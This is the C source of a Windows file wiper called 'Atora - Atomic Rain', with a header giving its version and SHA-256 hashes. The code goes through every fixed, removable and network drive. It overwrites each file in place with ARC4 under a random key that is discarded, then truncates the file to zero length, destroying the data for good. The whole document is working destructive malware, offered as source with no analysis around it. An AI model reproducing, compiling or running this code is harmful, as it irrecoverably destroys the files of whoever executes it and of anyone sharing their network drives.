/*
  Name:             Atora - Atomic Rain. Windows version.
  Version:          5.56/01.06.20
  Compiler:         TCC ver 0.9.27
  Class:            Files shredder for Windows. Wiper.
  What is he doing: Encrypts all files on all local drives with a cipher ARC4
  SHA-2-256:        17806e6725140db854bf80de7856f7f57097e43ef92d8fc7585c716096ba1f41
  SHA-2-256_UPX:    e31f0a9a18b198ac87ba792d49c299cfc59d5f316c6bb47f1f0abb372d1973bf
*/
#include <io.h>
#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stddef.h>
#include <windows.h>

#define BUFFER_SIZE 8192

char * PARAM_REWRITE_BYTE = "r+b";

char * expansion  = "*";
char * slash      = "\\";
char * t_one      = ".";
char * t_two      = "..";

size_t i, j;

typedef struct {
  uint8_t data       [256];
  uint8_t secret_key [256];
  uint8_t input      [BUFFER_SIZE];
  uint8_t output     [BUFFER_SIZE];
} MEMORY_CTX;

void swap (uint8_t * a, uint8_t * b) {
  uint8_t t = *a;

  *a = *b;
  *b = t;
}

void arc4_init(MEMORY_CTX * ctx, const size_t length) {

  for (i = 0; i < 256; i++)
    ctx->secret_key[i] = (uint8_t)i;

  for (i = j = 0; i < 256; i++) {
    j = (j + ctx->data[i % length] + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
  }

  i = j = 0;
}

void arc4(MEMORY_CTX * ctx, const size_t length) {
  for (register size_t k = 0; k < length; k++) {
    i = (i + 1) % 256;
    j = (j + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
    ctx->output[k] = ctx->input[k] ^ ctx->secret_key[(ctx->secret_key[i] + ctx->secret_key[j]) % 256];
  }
}

int genrand(const int min, const int max) {
  return min + rand() % ((max + 1) - min);
}

void write_trash(MEMORY_CTX * ctx, const size_t length) {
  for (register size_t i = 0; i < length; i++) {
    ctx->data[i] = (uint8_t)genrand(0x00, 0xFF);
  }
}

void generate_key(MEMORY_CTX * ctx) {
  write_trash(ctx, 256);
  arc4_init(ctx, 256);
}

long int size_of_file(FILE * f) {

  fseek(f, 0, SEEK_END);
  long int result = ftell(f);
  fseek(f, 0, SEEK_SET);

  return result;
}

void file_encrypt(MEMORY_CTX * ctx, const uint8_t * filename) {
  FILE * file = fopen((char *)filename, PARAM_REWRITE_BYTE);

  if (file == NULL) {
    return;
  }

  long int fsize = size_of_file(file);

  if ((fsize == -1L) || (fsize == 0)) {
    fclose(file);
    return;
  }

  long int position = 0;
  size_t   realread = 0;

  while (position < fsize) {
    realread = fread((void *)(ctx->input), 1, BUFFER_SIZE, file);

    arc4(ctx, realread);
    fseek(file, position, SEEK_SET);

    if (fwrite((void *)(ctx->output), 1, realread, file) != realread) {
      position = fsize;
      break;
    }

    fflush(file);
    position += (long int)realread;
  }

  memset((void *)(ctx->input),  0x00, BUFFER_SIZE);
  memset((void *)(ctx->output), 0x00, BUFFER_SIZE);

  (void)chsize(fileno(file), 0L);

  fclose(file);
}

void search_all_files(MEMORY_CTX * ctx, uint8_t * path, uint8_t * mask) {
  WIN32_FIND_DATA wfd;
  HANDLE hfound;

  uint8_t newpath[MAX_PATH];
  uint8_t fpath[MAX_PATH];
  uint8_t pathifile[MAX_PATH];
  uint8_t delpath[MAX_PATH];

  strcpy(fpath, path);
  strcat(fpath, slash);
  strcpy(delpath, fpath);
  strcat(fpath, mask);

  if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
    do {
      if ((strcmp(wfd.cFileName, t_two) != 0) && (strcmp(wfd.cFileName, t_one) != 0)) {
        if (wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
          strcpy(newpath, path);
          strcat(newpath, slash);
          strcat(newpath, wfd.cFileName);
          search_all_files(ctx, newpath, mask);
        }
        else {
          strcpy(pathifile, delpath);
          strcat(pathifile, wfd.cFileName);

          generate_key(ctx);
          file_encrypt(ctx, pathifile);
        }
      }
    } while(FindNextFile(hfound, &wfd) != 0);
  }

  FindClose(hfound);
}

int checklogicaldisk(const uint8_t number_disk) {
  uint8_t logical_disk[4] = "::\\";
          logical_disk[0] = number_disk;

  uint32_t result = GetDriveType(logical_disk);

  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOVABLE) || (result == DRIVE_REMOTE))
    return 0;
  else
    return (-1);
}

int main (void) {
  uint8_t local_disk[] = "::";
  size_t  memory_size = sizeof(MEMORY_CTX);

  MEMORY_CTX * memory = (MEMORY_CTX *)calloc(1, memory_size);

  if (memory != NULL) {
    srand((uint32_t)time(NULL));

    for (uint8_t disk = 'A'; disk <= 'Z'; disk++) {
      if (checklogicaldisk(disk) == 0) {
        local_disk[0] = disk;
        search_all_files(memory, local_disk, expansion);
      }
    }

    memset((void *)memory, 0x00, memory_size);
    free((void *)memory);
    memory = NULL;
  }

  return 0;
}
